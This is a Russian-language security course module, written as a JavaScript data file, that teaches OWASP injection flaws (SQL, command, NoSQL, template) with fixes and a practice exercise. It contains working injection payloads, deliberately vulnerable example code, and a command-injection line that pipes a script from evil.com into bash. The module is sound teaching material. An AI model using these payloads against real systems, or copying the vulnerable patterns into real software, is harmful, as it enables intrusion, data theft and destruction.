export default {
  id: 5,
  title: 'OWASP Top 10: Injection',
  description: 'SQL injection, NoSQL injection, command injection, LDAP injection — как работают, как обнаружить и как предотвратить инъекции.',
  lessons: [
    {
      id: 1,
      title: 'Что такое инъекции и почему они опасны',
      type: 'theory',
      content: [
        { type: 'text', value: 'Инъекция (Injection) — внедрение вредоносного кода через пользовательский ввод. Атакующий вставляет команды в поля ввода, которые интерпретируются как часть запроса. Injection стабильно входит в OWASP Top 10 как одна из самых опасных уязвимостей.' },
        { type: 'heading', value: 'Типы инъекций' },
        { type: 'list', value: [
          'SQL Injection — внедрение SQL команд в запросы к БД',
          'NoSQL Injection — инъекции в MongoDB, CouchDB и другие NoSQL БД',
          'Command Injection (OS Injection) — выполнение команд ОС',
          'LDAP Injection — внедрение в LDAP запросы',
          'XPath Injection — внедрение в XML запросы',
          'Template Injection (SSTI) — внедрение в шаблонизаторы (Jinja2, Twig)'
        ]},
        { type: 'code', language: 'sql', value: '-- Пример SQL Injection\n\n-- Уязвимый запрос (НЕ делайте так!):\n-- query = "SELECT * FROM users WHERE username = \'" + input + "\'"\n\n-- Нормальный ввод:\n-- input = "alice"\n-- SELECT * FROM users WHERE username = \'alice\'\n\n-- Атака:\n-- input = "\' OR \'1\'=\'1"\n-- SELECT * FROM users WHERE username = \'\' OR \'1\'=\'1\'\n-- Результат: ВСЕ пользователи возвращены!\n\n-- Более опасная атака:\n-- input = "\'; DROP TABLE users; --"\n-- SELECT * FROM users WHERE username = \'\'; DROP TABLE users; --\'\n-- Результат: таблица users УДАЛЕНА!\n\n-- Извлечение данных через UNION:\n-- input = "\' UNION SELECT username, password FROM admin_users --"\n-- SELECT * FROM users WHERE username = \'\' UNION SELECT username, password FROM admin_users --\'\n-- Результат: пароли администраторов!' },
        { type: 'warning', value: 'SQL injection может привести к: чтению всей БД, изменению/удалению данных, обходу аутентификации, выполнению команд ОС (через xp_cmdshell в MSSQL). Это полная компрометация системы.' }
      ]
    },
    {
      id: 2,
      title: 'SQL Injection: техники атак',
      type: 'theory',
      content: [
        { type: 'text', value: 'Существует несколько типов SQL injection: Classic (in-band), Blind (boolean-based и time-based), Error-based, UNION-based и Out-of-band. Понимание техник необходимо для правильной защиты.' },
        { type: 'heading', value: 'Типы SQL Injection' },
        { type: 'list', value: [
          'Classic (In-band) — результат атаки виден непосредственно в ответе',
          'UNION-based — использование UNION SELECT для извлечения данных из других таблиц',
          'Error-based — извлечение данных из сообщений об ошибках БД',
          'Blind Boolean — ответ да/нет (страница меняется или нет)',
          'Blind Time-based — задержка ответа (SLEEP/BENCHMARK) подтверждает условие',
          'Out-of-band — данные отправляются на внешний сервер (DNS, HTTP)'
        ]},
        { type: 'code', language: 'python', value: '# Пример уязвимого кода (Python + Flask + PostgreSQL)\n# ЭТО ПРИМЕР УЯЗВИМОГО КОДА — НЕ ИСПОЛЬЗУЙТЕ В ПРОДАКШЕНЕ!\n\nfrom flask import Flask, request\nimport psycopg2\n\napp = Flask(__name__)\n\n# УЯЗВИМО: конкатенация строк\n@app.route("/users")\ndef get_user_vulnerable():\n    username = request.args.get("username")\n    # ОПАСНО! Пользовательский ввод напрямую в SQL!\n    query = f"SELECT * FROM users WHERE username = \'{username}\'"\n    cursor.execute(query)\n    return cursor.fetchall()\n\n# Атакующий отправляет:\n# GET /users?username=\' OR 1=1 --\n# Результат: все пользователи\n\n# GET /users?username=\' UNION SELECT null,table_name FROM information_schema.tables --\n# Результат: список всех таблиц в БД!\n\n# Blind Boolean-based:\n# GET /users?username=admin\' AND (SELECT LENGTH(password) FROM users WHERE username=\'admin\')=8 --\n# Если ответ 200 — длина пароля 8 символов\n\n# Blind Time-based:\n# GET /users?username=admin\' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --\n# Если ответ через 5 секунд — условие истинно' },
        { type: 'tip', value: 'Для практики SQL injection используйте DVWA (Damn Vulnerable Web Application) или PortSwigger Web Security Academy. Никогда не тестируйте SQL injection на чужих системах без письменного разрешения!' }
      ]
    },
    {
      id: 3,
      title: 'Защита от SQL Injection',
      type: 'theory',
      content: [
        { type: 'text', value: 'Главное правило: НИКОГДА не подставляйте пользовательский ввод в SQL запросы через конкатенацию строк. Используйте параметризованные запросы (prepared statements), ORM или stored procedures.' },
        { type: 'heading', value: 'Методы защиты' },
        { type: 'code', language: 'python', value: '# === ЗАЩИТА №1: Параметризованные запросы (Prepared Statements) ===\n\nimport psycopg2\n\n# БЕЗОПАСНО: параметры передаются отдельно от запроса\ndef get_user_safe(username: str):\n    query = "SELECT * FROM users WHERE username = %s"\n    cursor.execute(query, (username,))  # %s — placeholder, не форматирование!\n    return cursor.fetchall()\n# БД знает что %s — это данные, а не SQL код\n# Ввод \' OR 1=1 -- будет обработан как строка, не как SQL\n\n# === ЗАЩИТА №2: ORM (Object Relational Mapping) ===\n\nfrom sqlalchemy import select\nfrom models import User\n\n# SQLAlchemy автоматически параметризует\ndef get_user_orm(session, username: str):\n    stmt = select(User).where(User.username == username)\n    return session.execute(stmt).scalars().all()\n\n# Django ORM\n# User.objects.filter(username=username)  # Безопасно!\n\n# === ЗАЩИТА №3: Валидация входных данных ===\n\nimport re\n\ndef validate_username(username: str) -> bool:\n    """Whitelist валидация: только буквы, цифры, подчёркивание"""\n    return bool(re.match(r"^[a-zA-Z0-9_]{3,30}$", username))\n\n# === ЗАЩИТА №4: Принцип наименьших привилегий для БД ===\n# Приложение подключается к БД с минимальными правами:\n# - Только SELECT, INSERT, UPDATE для нужных таблиц\n# - НЕ давать DROP, ALTER, GRANT\n# - Отдельный пользователь для каждого сервиса' },
        { type: 'code', language: 'javascript', value: '// Защита в Node.js\n\n// УЯЗВИМО:\nconst query = `SELECT * FROM users WHERE id = ${req.params.id}`;\ndb.query(query);\n\n// БЕЗОПАСНО: параметризованный запрос\nconst query = "SELECT * FROM users WHERE id = $1";\ndb.query(query, [req.params.id]);\n\n// БЕЗОПАСНО: с использованием Prisma ORM\nconst user = await prisma.user.findUnique({\n  where: { id: parseInt(req.params.id) }\n});\n\n// БЕЗОПАСНО: с использованием Knex.js query builder\nconst user = await knex("users")\n  .where("id", req.params.id)\n  .first();' },
        { type: 'warning', value: 'Экранирование (escaping) — НЕ надёжная защита! Используйте ТОЛЬКО параметризованные запросы. Escaping можно обойти в некоторых случаях (например, через multi-byte encoding).' }
      ]
    },
    {
      id: 4,
      title: 'Command Injection',
      type: 'theory',
      content: [
        { type: 'text', value: 'Command Injection (OS Injection) — выполнение произвольных команд операционной системы. Возникает когда приложение передаёт пользовательский ввод в shell-команды без sanitization.' },
        { type: 'code', language: 'python', value: '# === УЯЗВИМЫЙ КОД ===\nimport os\nimport subprocess\n\n# ОПАСНО: пользовательский ввод в os.system()\ndef ping_host_vulnerable(host: str):\n    os.system(f"ping -c 3 {host}")\n\n# Атака:\n# host = "8.8.8.8; cat /etc/passwd"\n# Выполнится: ping -c 3 8.8.8.8; cat /etc/passwd\n# Атакующий получает содержимое /etc/passwd!\n\n# host = "8.8.8.8 && curl http://evil.com/shell.sh | bash"\n# Выполнится reverse shell!\n\n# === БЕЗОПАСНЫЙ КОД ===\n\nimport shlex\nimport subprocess\nimport re\n\n# Метод 1: subprocess с массивом аргументов (БЕЗ shell=True)\ndef ping_host_safe(host: str):\n    # Валидация: только IP адрес или домен\n    if not re.match(r"^[a-zA-Z0-9.\\-]+$", host):\n        raise ValueError("Недопустимые символы в hostname")\n    \n    # subprocess с массивом — команды ОС НЕ интерпретируются\n    result = subprocess.run(\n        ["ping", "-c", "3", host],  # Массив, НЕ строка!\n        capture_output=True,\n        text=True,\n        timeout=10\n    )\n    return result.stdout\n\n# Метод 2: Избегайте shell вообще\n# Вместо вызова curl — используйте requests\n# Вместо вызова grep — используйте re\n# Вместо вызова ImageMagick — используйте Pillow\n\n# НИКОГДА не используйте:\n# os.system(user_input)\n# subprocess.call(user_input, shell=True)\n# eval(user_input)\n# exec(user_input)' },
        { type: 'list', value: [
          'Используйте subprocess с массивом аргументов (не строку, не shell=True)',
          'Валидируйте ввод: whitelist допустимых символов',
          'По возможности замените shell-команды на встроенные библиотеки',
          'Запускайте приложение с минимальными привилегиями ОС',
          'Никогда не используйте eval(), exec() с пользовательскими данными'
        ]},
        { type: 'warning', value: 'Command injection — одна из самых опасных уязвимостей. Она даёт атакующему полный доступ к серверу (Remote Code Execution). Один вызов os.system() с пользовательским вводом может привести к полной компрометации.' }
      ]
    },
    {
      id: 5,
      title: 'NoSQL Injection и Template Injection',
      type: 'theory',
      content: [
        { type: 'text', value: 'NoSQL инъекции встречаются в MongoDB, CouchDB и других NoSQL базах. Template injection (SSTI) позволяет выполнять код через серверные шаблонизаторы (Jinja2, Twig, Pug).' },
        { type: 'heading', value: 'NoSQL Injection в MongoDB' },
        { type: 'code', language: 'javascript', value: '// === NoSQL Injection в MongoDB ===\n\n// УЯЗВИМО: пользовательский объект в запросе\napp.post("/login", async (req, res) => {\n  const { username, password } = req.body;\n  \n  // Если атакующий отправит JSON:\n  // { "username": {"$gt": ""}, "password": {"$gt": ""} }\n  // MongoDB интерпретирует $gt как оператор!\n  const user = await db.collection("users").findOne({\n    username: username,  // {"$gt": ""} — любой username > ""\n    password: password   // {"$gt": ""} — любой password > ""\n  });\n  // Результат: возвращает первого пользователя (обход аутентификации!)\n});\n\n// БЕЗОПАСНО: валидация типов\napp.post("/login", async (req, res) => {\n  const { username, password } = req.body;\n  \n  // Проверяем что это строки, а не объекты\n  if (typeof username !== "string" || typeof password !== "string") {\n    return res.status(400).json({ error: "Invalid input" });\n  }\n  \n  // Используем $eq явно\n  const user = await db.collection("users").findOne({\n    username: { $eq: username },\n    password: { $eq: hashPassword(password) }\n  });\n});' },
        { type: 'heading', value: 'Server-Side Template Injection (SSTI)' },
        { type: 'code', language: 'python', value: '# === SSTI в Jinja2 (Python/Flask) ===\n\nfrom flask import Flask, request, render_template_string\n\n# УЯЗВИМО: пользовательский ввод в шаблон\n@app.route("/greet")\ndef greet_vulnerable():\n    name = request.args.get("name")\n    template = f"<h1>Привет, {name}!</h1>"  # ОПАСНО!\n    return render_template_string(template)\n\n# Атака: name = {{7*7}}\n# Результат: <h1>Привет, 49!</h1>\n# Подтверждение SSTI!\n\n# Более опасная атака:\n# name = {{config.items()}}  — утечка конфигурации\n# name = {{"".__class__.__mro__[1].__subclasses__()}} — RCE!\n\n# БЕЗОПАСНО: использовать шаблон с переменными\n@app.route("/greet")\ndef greet_safe():\n    name = request.args.get("name")\n    return render_template_string(\n        "<h1>Привет, {{ name }}!</h1>",  # name — переменная шаблона\n        name=name  # Передаётся как данные, не как код\n    )\n\n# ЕЩЁ ЛУЧШЕ: использовать файл шаблона\n# return render_template("greet.html", name=name)' },
        { type: 'tip', value: 'Для защиты от NoSQL injection: валидируйте типы (string vs object), используйте mongo-sanitize в Express. Для SSTI: никогда не подставляйте пользовательский ввод в строку шаблона, всегда передавайте как переменные.' }
      ]
    },
    {
      id: 6,
      title: 'Практика: Обнаружение и исправление инъекций',
      type: 'practice',
      difficulty: 'hard',
      description: 'Найдите и исправьте все уязвимости инъекций в предоставленном коде. Убедитесь что исправления не ломают функциональность.',
      requirements: [
        'Найдите SQL injection в функции поиска пользователей',
        'Исправьте SQL injection с помощью параметризованных запросов',
        'Найдите и исправьте command injection в функции проверки домена',
        'Найдите и исправьте NoSQL injection в функции логина',
        'Добавьте валидацию входных данных ко всем функциям'
      ],
      hint: 'Ищите конкатенацию строк в SQL запросах, os.system/subprocess с shell=True, и прямую подстановку объектов в MongoDB запросы.',
      expectedOutput: 'Найдены уязвимости:\n1. SQL Injection в /search — конкатенация строк в запросе\n2. Command Injection в /check-domain — os.system с user input\n3. NoSQL Injection в /login — нет проверки типа\n\nИсправления:\n1. Параметризованный запрос: cursor.execute("... WHERE name LIKE %s", (f"%{query}%",))\n2. subprocess.run(["dig", domain]) + regex валидация домена\n3. Проверка typeof === "string" + явный $eq оператор',
      solution: '# Исходный уязвимый код и исправления:\n\nimport re\nimport subprocess\nimport psycopg2\n\n# === 1. SQL Injection — ИСПРАВЛЕНИЕ ===\n\n# БЫЛО (уязвимо):\n# def search_users(query):\n#     sql = f"SELECT * FROM users WHERE name LIKE \'%{query}%\'"\n#     cursor.execute(sql)\n\n# СТАЛО (безопасно):\ndef search_users(cursor, query: str):\n    if not isinstance(query, str) or len(query) > 100:\n        raise ValueError("Невалидный запрос")\n    sql = "SELECT * FROM users WHERE name LIKE %s"\n    cursor.execute(sql, (f"%{query}%",))\n    return cursor.fetchall()\n\n# === 2. Command Injection — ИСПРАВЛЕНИЕ ===\n\n# БЫЛО (уязвимо):\n# def check_domain(domain):\n#     os.system(f"dig {domain}")\n\n# СТАЛО (безопасно):\ndef check_domain(domain: str) -> str:\n    # Whitelist валидация домена\n    if not re.match(r"^[a-zA-Z0-9][a-zA-Z0-9.\\-]{1,253}[a-zA-Z0-9]$", domain):\n        raise ValueError("Недопустимое имя домена")\n    \n    result = subprocess.run(\n        ["dig", "+short", domain],  # Массив аргументов, без shell\n        capture_output=True,\n        text=True,\n        timeout=10\n    )\n    return result.stdout\n\n# === 3. NoSQL Injection — ИСПРАВЛЕНИЕ ===\n# (Express.js / MongoDB)\n# БЫЛО:\n# const user = await db.findOne({ username, password })\n\n# СТАЛО:\n# if (typeof username !== "string" || typeof password !== "string") {\n#   return res.status(400).json({ error: "Invalid input" });\n# }\n# const user = await db.findOne({\n#   username: { $eq: username },\n#   password: { $eq: hashPassword(password) }\n# });\n\n# === 4. Тесты ===\ndef test_sql_injection_prevented():\n    """Проверка что SQL injection не работает"""\n    malicious_inputs = [\n        "\' OR \'1\'=\'1",\n        "\'; DROP TABLE users; --",\n        "\' UNION SELECT * FROM admin --",\n    ]\n    for payload in malicious_inputs:\n        try:\n            result = search_users(cursor, payload)\n            assert len(result) == 0, f"Payload сработал: {payload}"\n        except ValueError:\n            pass  # Валидация отклонила — хорошо\n\nprint("Все уязвимости исправлены!")',
      explanation: 'Ключевые принципы защиты от инъекций: 1) Параметризованные запросы для SQL, 2) subprocess с массивом аргументов (без shell=True) для ОС команд, 3) Проверка типов для NoSQL, 4) Whitelist валидация входных данных, 5) Принцип наименьших привилегий для БД аккаунта.'
    }
  ]
}
